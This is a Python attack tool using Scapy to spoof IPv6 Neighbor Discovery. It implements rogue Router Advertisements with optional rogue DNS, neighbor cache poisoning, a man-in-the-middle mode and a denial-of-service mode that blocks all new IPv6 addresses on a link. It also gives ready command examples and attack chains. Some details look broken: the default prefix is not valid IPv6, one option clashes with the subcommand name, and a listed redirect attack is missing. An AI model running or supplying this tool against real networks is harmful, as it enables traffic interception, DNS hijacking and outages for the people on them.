#!/usr/bin/env python3
"""
IPv6 NDP Spoofer - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

IPv6 Neighbor Discovery Protocol poisoning:
- Rogue Router Advertisement (RA) - inject prefix, become default route
- Neighbor Advertisement (NA) poisoning - L3→L2 cache manipulation (IPv6 ARP)
- DHCPv6 RA redirect - force M=1 to steer clients to rogue DHCPv6 server
- DAD DoS - deny any new address assignment
- ICMPv6 Redirect - reroute specific host traffic

ICMPv6 types (RFC 4861 - O'Reilly IPv6 Security):
  133 = Router Solicitation    (ff02::2 all-routers)
  134 = Router Advertisement   (ff02::1 all-nodes)
  135 = Neighbor Solicitation  (ff02::1:ff<24-bit suffix> solicited-node)
  136 = Neighbor Advertisement (unicast or ff02::1)
  137 = Redirect

CRITICAL: hlim=255 required on ALL NDP packets (types 133-137).
Stacks silently drop NDP with hlim != 255. Scapy default is 64.

NA flags:
  R=1: Sender is a router
  S=1: Solicited response (to an NS)
  O=1: Override existing neighbor cache entry

RA flags:
  M=1: Managed - get address from DHCPv6 (stateful)
  O=1: Other  - get options (DNS) from DHCPv6 only, SLAAC for address

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import sys
import time
import threading

try:
    from scapy.all import (
        IPv6, Ether, ICMPv6ND_RA, ICMPv6ND_NA, ICMPv6ND_NS, ICMPv6ND_RS,
        ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr,
        ICMPv6NDOptMTU, ICMPv6NDOptRDNSS,
        ICMPv6EchoRequest, ICMPv6EchoReply,
        sendp, send, srp, sniff, conf, get_if_hwaddr, get_if_addr
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    print("[!] Scapy not installed: pip install scapy")
    sys.exit(1)

conf.verb = 0


# ─── Rogue Router Advertisement ──────────────────────────────────────────────

class RogueRA:
    """
    Rogue Router Advertisement.

    Sends ICMPv6 type 134 to ff02::1 with a forged prefix.
    Clients perform SLAAC: auto-configure an address from the prefix
    and use our link-local as default gateway.

    Modes:
    - prefix: Standard RA with prefix info → clients SLAAC from our prefix
    - dhcpv6: M=1 O=1 → forces clients to use DHCPv6 (no SLAAC)
    - dos:    routerlifetime=0 → removes any default route

    thc-ipv6 equivalent: fake_router6 <iface> <src-ll> <prefix/len> <lifetime>
    """

    ALL_NODES = "ff02::1"

    def __init__(self, iface: str, attacker_mac: str = None,
                 prefix: str = "2001:db8:evil::",
                 prefix_len: int = 64,
                 lifetime: int = 1800,
                 dns_server: str = None,
                 mode: str = "prefix",
                 verbose: bool = False):
        self.iface = iface
        self.attacker_mac = attacker_mac or get_if_hwaddr(iface)
        self.prefix = prefix
        self.prefix_len = prefix_len
        self.lifetime = lifetime  # router lifetime in seconds
        self.dns_server = dns_server
        self.mode = mode
        self.verbose = verbose

    def _build_ra(self) -> object:
        """Build the RA packet."""
        # RA flags
        if self.mode == "dhcpv6":
            ra = ICMPv6ND_RA(M=1, O=1, routerlifetime=self.lifetime)
            # M=1 O=1 = stateful DHCPv6; A=0 in prefix = no SLAAC from this prefix
            prefix_flags = {"L": 1, "A": 0}
        elif self.mode == "dos":
            ra = ICMPv6ND_RA(M=0, O=0, routerlifetime=0)
            prefix_flags = {"L": 1, "A": 1}
        else:
            ra = ICMPv6ND_RA(M=0, O=0, routerlifetime=self.lifetime)
            prefix_flags = {"L": 1, "A": 1}

        pkt = (
            Ether(dst="33:33:00:00:00:01") /
            IPv6(dst=self.ALL_NODES, hlim=255) /   # hlim=255 required or stack drops
            ra /
            ICMPv6NDOptPrefixInfo(
                prefixlen=self.prefix_len,
                L=prefix_flags["L"],
                A=prefix_flags["A"],
                validlifetime=0xffffffff,
                preferredlifetime=0xffffffff,
                prefix=self.prefix
            ) /
            ICMPv6NDOptSrcLLAddr(lladdr=self.attacker_mac) /
            ICMPv6NDOptMTU(mtu=1500)
        )

        # Optional DNS server (RFC 6106 RDNSS option)
        if self.dns_server:
            pkt /= ICMPv6NDOptRDNSS(lifetime=self.lifetime,
                                     dns=[self.dns_server])

        return pkt

    def announce(self):
        """Send a single RA."""
        pkt = self._build_ra()
        sendp(pkt, iface=self.iface, verbose=0)
        if self.verbose:
            print(f"[+] RA sent: {self.prefix}/{self.prefix_len} lifetime={self.lifetime}s mode={self.mode}")

    def flood(self, interval: int = 5):
        """Send periodic RAs (keeps our route active, defeats legit RA)."""
        print(f"[*] Rogue RA flood: {self.prefix}/{self.prefix_len} every {interval}s (Ctrl+C to stop)")
        try:
            while True:
                self.announce()
                time.sleep(interval)
        except KeyboardInterrupt:
            print("\n[+] RA flood stopped")


# ─── Neighbor Advertisement Cache Poisoning ──────────────────────────────────

class NDPPoisoner:
    """
    Neighbor Advertisement (NA) cache poisoning - IPv6 ARP spoofing.

    Sends ICMPv6 type 136 with:
    - tgt = victim address (whose MAC we're lying about)
    - O=1 (override existing cache entry)
    - DstLLAddr option = our MAC

    Equivalent to ARP spoofing for IPv4.
    thc-ipv6 equivalent: fake_advertise6 / parasite6

    Attack: unicast to specific victim, or broadcast to ff02::1 for
    subnet-wide cache poisoning.
    """

    def __init__(self, iface: str, victim_ip6: str,
                 target_ip6: str = "ff02::1",
                 attacker_mac: str = None,
                 verbose: bool = False):
        self.iface = iface
        self.victim_ip6 = victim_ip6    # IP whose MAC we're stealing
        self.target_ip6 = target_ip6    # Who we're lying to
        self.attacker_mac = attacker_mac or get_if_hwaddr(iface)
        self.verbose = verbose
        self.count = 0

    def _get_ll(self, iface: str) -> str:
        """Get link-local IPv6 address from interface."""
        import subprocess
        try:
            out = subprocess.check_output(
                ["ip", "-6", "addr", "show", "dev", iface, "scope", "link"],
                text=True
            )
            for line in out.splitlines():
                if "inet6 fe80" in line:
                    return line.strip().split()[1].split("/")[0]
        except Exception:
            pass
        return "fe80::1"

    def poison(self):
        """Send unsolicited NA claiming victim_ip6 = our MAC."""
        src_ll = self._get_ll(self.iface)
        pkt = (
            Ether(dst="33:33:00:00:00:01") /
            IPv6(src=self.victim_ip6, dst=self.target_ip6, hlim=255) /
            ICMPv6ND_NA(
                R=0,          # Not a router (quieter)
                S=0,          # Unsolicited
                O=1,          # Override - force cache update
                tgt=self.victim_ip6
            ) /
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)
        )
        sendp(pkt, iface=self.iface, verbose=0)
        self.count += 1
        if self.verbose:
            print(f"[⚡] NA: {self.victim_ip6} → {self.attacker_mac} (count: {self.count})")

    def poison_bidirectional(self, gateway_ip6: str):
        """
        Bidirectional NDP poisoning (full MITM).
        - Tell all-nodes: victim is at our MAC
        - Tell victim: gateway is at our MAC
        """
        src_ll = self._get_ll(self.iface)

        # Poison subnet: victim's address → our MAC
        pkt_to_all = (
            Ether(dst="33:33:00:00:00:01") /
            IPv6(src=self.victim_ip6, dst="ff02::1", hlim=255) /
            ICMPv6ND_NA(R=0, S=0, O=1, tgt=self.victim_ip6) /
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)
        )

        # Poison victim: gateway's address → our MAC
        pkt_to_victim = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IPv6(src=gateway_ip6, dst=self.victim_ip6, hlim=255) /
            ICMPv6ND_NA(R=0, S=0, O=1, tgt=gateway_ip6) /
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)
        )

        sendp(pkt_to_all, iface=self.iface, verbose=0)
        sendp(pkt_to_victim, iface=self.iface, verbose=0)
        self.count += 2
        if self.verbose:
            print(f"[⚡] Bidirectional NDP: victim={self.victim_ip6} gw={gateway_ip6}")

    def flood(self, interval: float = 2.0, gateway_ip6: str = None):
        """Continuous NDP poisoning."""
        mode = "bidirectional" if gateway_ip6 else "broadcast"
        print(f"[*] NDP poison flood [{mode}] targeting {self.victim_ip6} ({interval}s interval)")
        try:
            while True:
                if gateway_ip6:
                    self.poison_bidirectional(gateway_ip6)
                else:
                    self.poison()
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n[+] NDP flood stopped ({self.count} packets sent)")


# ─── DAD DoS (Duplicate Address Detection) ───────────────────────────────────

class DADPoison:
    """
    Duplicate Address Detection DoS.

    Intercepts Neighbor Solicitations for DAD (target=new address, src=::).
    Replies with NA claiming we already own that address.
    Victim backs off and never assigns the address.

    thc-ipv6 equivalent: dos-new-ip6 <iface>
    """

    def __init__(self, iface: str, attacker_mac: str = None, verbose: bool = False):
        self.iface = iface
        self.attacker_mac = attacker_mac or get_if_hwaddr(iface)
        self.verbose = verbose
        self.denied = 0

    def _handle_ns(self, pkt):
        """Intercept DAD NS and reply with fake NA."""
        if not pkt.haslayer(ICMPv6ND_NS):
            return

        ns = pkt[ICMPv6ND_NS]
        src = pkt[IPv6].src

        # DAD NS: source = :: (unspecified)
        if src != "::":
            return

        target = ns.tgt
        self.denied += 1
        if self.verbose:
            print(f"[💀] DAD intercepted: blocking {target} (denied #{self.denied})")

        # Reply: NA claiming we own this address
        reply = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IPv6(src=target, dst="ff02::1", hlim=255) /
            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target) /
            ICMPv6NDOptDstLLAddr(lladdr=self.attacker_mac)
        )
        sendp(reply, iface=self.iface, verbose=0)

    def run(self):
        """Listen and deny all DAD attempts on the link."""
        print(f"[*] DAD DoS active on {self.iface} (denying all new IPv6 address assignments)")
        try:
            sniff(
                iface=self.iface,
                filter="icmp6",
                prn=self._handle_ns,
                store=0
            )
        except KeyboardInterrupt:
            print(f"\n[+] DAD DoS stopped. Denied {self.denied} address assignments")


# ─── Combined MITM (RA + NDP) ────────────────────────────────────────────────

def mitm_full(iface: str, prefix: str = "2001:db8:evil::",
              prefix_len: int = 64, victim_ip6: str = None,
              gateway_ip6: str = None, verbose: bool = False):
    """
    Full IPv6 MITM:
    1. Rogue RA → all-nodes (become default router via SLAAC)
    2. NDP poison → victim's cache (gateway points to us)
    Run both simultaneously in parallel threads.
    """
    attacker_mac = get_if_hwaddr(iface)
    print(f"[*] IPv6 MITM: prefix={prefix}/{prefix_len}")
    print(f"[*] Attacker MAC: {attacker_mac}")

    ra = RogueRA(iface=iface, prefix=prefix, prefix_len=prefix_len,
                 mode="prefix", verbose=verbose)

    def ra_thread():
        ra.flood(interval=5)

    threads = [threading.Thread(target=ra_thread, daemon=True)]

    if victim_ip6:
        ndp = NDPPoisoner(iface=iface, victim_ip6=victim_ip6,
                          attacker_mac=attacker_mac, verbose=verbose)

        def ndp_thread():
            ndp.flood(interval=2.0, gateway_ip6=gateway_ip6)

        threads.append(threading.Thread(target=ndp_thread, daemon=True))

    for t in threads:
        t.start()

    print(f"[+] MITM active. Traffic for {prefix}/{prefix_len} routes through us.")
    print(f"[*] Enable IPv6 forwarding: sysctl net.ipv6.conf.all.forwarding=1")
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[+] IPv6 MITM stopped")


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="IPv6 NDP Spoofer - Rogue RA and NA poisoning",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  rogue-ra       - Rogue Router Advertisement (become default IPv6 router)
  ndp-poison     - NA cache poisoning (IPv6 ARP spoofing)
  dad-dos        - DAD DoS (deny all new address assignments on link)
  mitm           - Full MITM: rogue RA + NDP poisoning simultaneously

Examples:
  # Inject rogue RA with SLAAC prefix
  sudo python3 ndp-spoof.py rogue-ra eth0 --prefix 2001:db8:evil:: --len 64 -v

  # Force DHCPv6 (M=1): steer to rogue DHCPv6 server on ff02::1:2
  sudo python3 ndp-spoof.py rogue-ra eth0 --mode dhcpv6 --lifetime 1800

  # Remove default route (lifetime=0 RA)
  sudo python3 ndp-spoof.py rogue-ra eth0 --mode dos

  # Poison neighbor cache for one victim
  sudo python3 ndp-spoof.py ndp-poison eth0 2001:db8::victim

  # Bidirectional poisoning (full MITM for victim)
  sudo python3 ndp-spoof.py ndp-poison eth0 2001:db8::victim --gateway fe80::1

  # Block all new IPv6 address assignments on link (DAD DoS)
  sudo python3 ndp-spoof.py dad-dos eth0

  # Full MITM: rogue RA + NDP poisoning
  sudo python3 ndp-spoof.py mitm eth0 --prefix fd00:evil:: --victim 2001:db8::100 --gateway fe80::1

Protocol Notes:
  hlim=255  REQUIRED on all NDP packets (types 133-137) — stacks silently drop otherwise
  O=1       Override flag forces cache update even if entry exists
  M=1 RA    Forces DHCPv6 stateful addressing (no SLAAC)
  DAD NS    Source = :: (unspecified); our NA response defeats any address

Attack Chains:
  1. Rogue RA (SLAAC) → victims route through us → intercept all IPv6 traffic
  2. Rogue RA (M=1) + rogue DHCPv6 → control DNS + gateway for all new clients
  3. NDP poison (bidirectional) → MITM between specific victim and gateway
  4. DAD DoS → prevent any host from getting an IPv6 address (network DoS)

thc-ipv6 equivalents:
  fake_router6 eth0 fe80::1 2001:db8:evil::/64 1000
  fake_advertise6 eth0 <victim> ff02::1 <our-mac>
  parasite6 eth0
  dos-new-ip6 eth0

CONTROLLED ENVIRONMENT ONLY
        """
    )

    subparsers = parser.add_subparsers(dest="mode")

    # rogue-ra
    p_ra = subparsers.add_parser("rogue-ra", help="Rogue Router Advertisement")
    p_ra.add_argument("iface", help="Network interface")
    p_ra.add_argument("--prefix", default="2001:db8:evil::",
                      help="IPv6 prefix to advertise (default: 2001:db8:evil::)")
    p_ra.add_argument("--len", type=int, default=64, dest="prefix_len",
                      help="Prefix length (default: 64)")
    p_ra.add_argument("--lifetime", type=int, default=1800,
                      help="Router lifetime in seconds (0 = remove default route)")
    p_ra.add_argument("--mode", choices=["prefix", "dhcpv6", "dos"], default="prefix",
                      help="RA mode: prefix=SLAAC, dhcpv6=M/O flags, dos=remove route")
    p_ra.add_argument("--dns", help="Optional DNS server IPv6 for RDNSS option")
    p_ra.add_argument("--interval", type=int, default=5,
                      help="Seconds between RAs (default: 5)")
    p_ra.add_argument("--once", action="store_true", help="Send single RA then exit")
    p_ra.add_argument("-v", "--verbose", action="store_true")

    # ndp-poison
    p_ndp = subparsers.add_parser("ndp-poison", help="Neighbor Advertisement cache poisoning")
    p_ndp.add_argument("iface", help="Network interface")
    p_ndp.add_argument("victim", help="IPv6 address to poison (whose MAC we steal)")
    p_ndp.add_argument("--target", default="ff02::1",
                       help="Who to tell the lie to (default: ff02::1 all-nodes)")
    p_ndp.add_argument("--gateway", help="Gateway IPv6 for bidirectional MITM")
    p_ndp.add_argument("--mac", help="MAC to impersonate (default: our MAC)")
    p_ndp.add_argument("--interval", type=float, default=2.0,
                       help="Seconds between NA packets (default: 2.0)")
    p_ndp.add_argument("--once", action="store_true", help="Send single NA then exit")
    p_ndp.add_argument("-v", "--verbose", action="store_true")

    # dad-dos
    p_dad = subparsers.add_parser("dad-dos", help="DAD Duplicate Address Detection DoS")
    p_dad.add_argument("iface", help="Network interface")
    p_dad.add_argument("-v", "--verbose", action="store_true")

    # mitm
    p_mitm = subparsers.add_parser("mitm", help="Full IPv6 MITM (RA + NDP)")
    p_mitm.add_argument("iface", help="Network interface")
    p_mitm.add_argument("--prefix", default="2001:db8:evil::", help="IPv6 prefix")
    p_mitm.add_argument("--len", type=int, default=64, dest="prefix_len")
    p_mitm.add_argument("--victim", help="Victim IPv6 for NDP poisoning")
    p_mitm.add_argument("--gateway", help="Gateway IPv6 for bidirectional poisoning")
    p_mitm.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    if args.mode is None:
        parser.print_help()
        sys.exit(1)

    if args.mode == "rogue-ra":
        ra = RogueRA(
            iface=args.iface, prefix=args.prefix, prefix_len=args.prefix_len,
            lifetime=args.lifetime, dns_server=args.dns, mode=args.mode,
            verbose=args.verbose
        )
        if args.once:
            ra.announce()
            print(f"[+] Single RA sent: {args.prefix}/{args.prefix_len} (mode={args.mode})")
        else:
            ra.flood(interval=args.interval)

    elif args.mode == "ndp-poison":
        ndp = NDPPoisoner(
            iface=args.iface, victim_ip6=args.victim, target_ip6=args.target,
            attacker_mac=args.mac, verbose=args.verbose
        )
        if args.once:
            if args.gateway:
                ndp.poison_bidirectional(args.gateway)
            else:
                ndp.poison()
            print("[+] Single NA sent")
        else:
            ndp.flood(interval=args.interval, gateway_ip6=args.gateway)

    elif args.mode == "dad-dos":
        dad = DADPoison(iface=args.iface, verbose=args.verbose)
        dad.run()

    elif args.mode == "mitm":
        mitm_full(
            iface=args.iface, prefix=args.prefix, prefix_len=args.prefix_len,
            victim_ip6=args.victim, gateway_ip6=args.gateway, verbose=args.verbose
        )


if __name__ == "__main__":
    main()
